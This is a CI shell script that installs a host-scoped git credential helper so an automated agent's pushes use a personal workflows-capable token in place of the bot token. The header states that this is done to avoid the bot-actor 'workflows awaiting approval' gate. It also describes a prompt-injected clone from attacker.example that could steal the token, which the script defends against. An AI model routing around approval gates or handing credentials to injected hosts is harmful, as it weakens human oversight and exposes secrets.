#!/usr/bin/env bash
# install-source-git-credentials.sh — make SOURCE_GITHUB_TOKEN the credential
# that wins for github.com pushes, instead of the checkout's GitHub App token
# (github-actions[bot]). gh-63: bot-actor pushes put every machine PR behind
# the "workflows awaiting approval" gate and cannot touch .github/workflows.
#
# Shared by EVERY push path in a run (the "Configure Git Author + push
# credentials" step and the memory-persist re-assert) so the logic exists
# exactly once (review: the inline copies drifted / had to be fixed 6x).
# Idempotent — safe to call again later in the same job.
#
# Callers must export SOURCE_GITHUB_TOKEN; GITHUB_WORKSPACE
# come from the Actions environment (sane fallbacks below).
#
# What it does, in order:
#   1. Purge the checkout's persisted App token:
#        - actions/checkout (verified against the shipped v4.2.2 and v5.0.0
#          dist) writes http.https://github.com/.extraheader DIRECTLY into
#          the repo's local .git/config (configureToken → local config,
#          globalConfig = false). It never writes any RUNNER_TEMP include
#          file — an earlier version of this script claimed so and removed
#          a matching temp-file glob, a silent no-op that chased a file
#          that does not exist (PR #68 review thread 7). `git config
#          --unset-all` on the local config is what actually purges the
#          main repo.
#        - with submodules: true, checkout ALSO writes the real token
#          extraheader into EACH submodule's local config
#          (.git/modules/<name>/config) — a `git submodule foreach
#          --recursive` purge follows, or any push from inside agents/
#          still authenticates as github-actions[bot] (thread 8).
#        - belt-and-braces: the global config too (older checkout versions
#          persisted the extraheader globally).
#   2. Install the credential that must win, HOST-SCOPED to github.com:
#        a generic `credential.helper` is consulted for ANY https host whose
#        server answers 401 — a prompt-injected `git clone
#        https://attacker.example/repo.git` would receive the
#        workflows-capable PAT. The helper is therefore registered on
#        `credential.https://github.com.helper` (only consulted for matching
#        URLs) and ALSO re-checks the host from its stdin before answering.
#        Both inherited helper lists (generic + github.com-scoped) are reset
#        first, so this checkout is immune to anything that adds helpers
#        later (e.g. a mid-run `gh auth setup-git`, runner-image config).
#        Each invocation is logged to .dmtools/credential-helper.log with a
#        CRED_HELPER_CONTEXT tag — the at-push-time proof of which
#        credential served the push (trace dry-runs tag themselves
#        `trace-dry-run` so they cannot inflate the push evidence).
#   3. Best-effort: attribute commits to the SOURCE account (its noreply
#      email). The PUSH actor is what matters for the approval gate; dm.ai
#      stays the fallback when the lookup fails.
set -euo pipefail

# Fallback commit identity — overridden below when the SOURCE account resolves.
git config --global user.name "dm.ai"
git config --global user.email "dm.ai@epam.com"

if [ -z "${SOURCE_GITHUB_TOKEN:-}" ]; then
  echo "::warning::SOURCE_GITHUB_TOKEN not set — no push credential installed. The checkout no longer persists its App token (persist-credentials: false, gh-63), so pushes FAIL instead of silently authenticating as github-actions[bot] and landing behind the bot-actor approval gate"
  exit 0
fi

# ── 1. Purge the checkout's persisted App token (gh-63 root cause) ──
# Main repo local config (where checkout's configureToken actually writes
# it — see the header comment), then global, then every submodule's local
# config (checkout's configureSubmoduleAuth arms those too when the
# workflow checks out with submodules: true).
git config --unset-all http.https://github.com/.extraheader || true
git config --global --unset-all http.https://github.com/.extraheader || true
git submodule foreach --recursive \
  'git config --unset-all http.https://github.com/.extraheader || true' >/dev/null || true

# ── 2. The credential that must win: SOURCE_GITHUB_TOKEN, github.com only ──
# One line on purpose: `git config` rejects multi-line values. Inner quoting
# is double-quote only (the whole value is single-quoted here).
# Guards, in order: the OPERATION ($1 = get|store|erase — only `get` is
# answered, so approve/reject can never log a phantom "served" line), then
# the HOST from stdin. --replace-all on the resets: this script runs more
# than once per job and a plain single-value write on a multi-valued key
# errors out under bash -e.
# The empty `credential.helper ''` value is a marker that RESETS the helper
# list accumulated from system/global scope; the same reset for the
# github.com-scoped key wipes any inherited scoped helper.
helper='!f() { [ "$1" = "get" ] || return 0; input="$(cat)"; host="$(printf "%s\n" "$input" | sed -n "s/^host=//p" | head -n 1)"; [ "$host" = "github.com" ] || return 0; echo "username=x-access-token"; echo "password=${SOURCE_GITHUB_TOKEN}"; mkdir -p "${GITHUB_WORKSPACE:-.}/.dmtools" 2>/dev/null || true; printf "[%s] SOURCE_GITHUB_TOKEN credential served (%s)\n" "$(date -u +%FT%TZ)" "${CRED_HELPER_CONTEXT:-git}" >> "${GITHUB_WORKSPACE:-.}/.dmtools/credential-helper.log" 2>/dev/null || true; echo "credential-helper: served SOURCE_GITHUB_TOKEN for github.com (context: ${CRED_HELPER_CONTEXT:-git})" >&2; }; f'
git config --local --replace-all credential.helper ''
git config --local --replace-all credential.https://github.com.helper ''
git config --local --add credential.https://github.com.helper "$helper"
# Global fallback for pushes from OTHER checkouts (fresh clones or worktrees
# the agent creates have no local reset; helpers resolve in declaration order
# and git stops at the first complete credential — SOURCE wins there too).
git config --global --replace-all credential.https://github.com.helper "$helper"
echo "→ git pushes will use SOURCE_GITHUB_TOKEN (workflows-capable), host-scoped to https://github.com; App-token header purged"

# ── 3. Attribute commits to the SOURCE account when resolvable ──
identity="$(GH_TOKEN="$SOURCE_GITHUB_TOKEN" gh api user --jq '"\(.id)+\(.login)"' 2>/dev/null || true)"
if echo "$identity" | grep -qE '^[0-9]+\+[^[:space:]@]+$'; then
  git config --global user.email "${identity}@users.noreply.github.com"
  echo "→ commit author email: ${identity}@users.noreply.github.com (SOURCE account noreply)"
fi
